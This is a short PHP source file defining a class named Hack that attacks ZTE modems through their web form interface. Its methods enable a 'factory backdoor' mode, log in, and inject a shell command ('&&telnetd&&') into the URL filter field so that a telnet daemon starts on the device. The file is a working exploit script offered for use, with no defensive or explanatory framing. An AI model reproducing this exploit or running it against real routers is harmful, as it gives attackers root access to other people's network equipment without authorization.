<?php

namespace ZTE;

class Hack
{

  private $_modem_ip = "";
  private $_passwd = "";

  public function __construct($modem_ip, $passwd)
  {
    $this->_modem_ip = $modem_ip;
    $this->_passwd = base64_encode($passwd);
  }

  /*
  * Enable Factory Backdoor
  * return @array
  */
  public function factory_backdoor()
  {
    $data ="?isTest=false";
    $data .="&goformId=CHANGE_MODE";
    $data .="&change_mode=2";
    $data .="&password=".$this->_passwd;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * Enable Enable Root Access
  * return @array
  */
  public function enable_root_access()
  {
    $data = 'isTest=false';
    $data .= '&goformId=LOGIN';
    $data .= '&password='.$this->_passwd;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * Exploits Nvram
  * return @array
  */
  public function exploits_nvram()
  {

    $data = "isTest=false";
    $data .= "&goformId=URL_FILTER_ADD";
    $data .= "&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26";

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

}
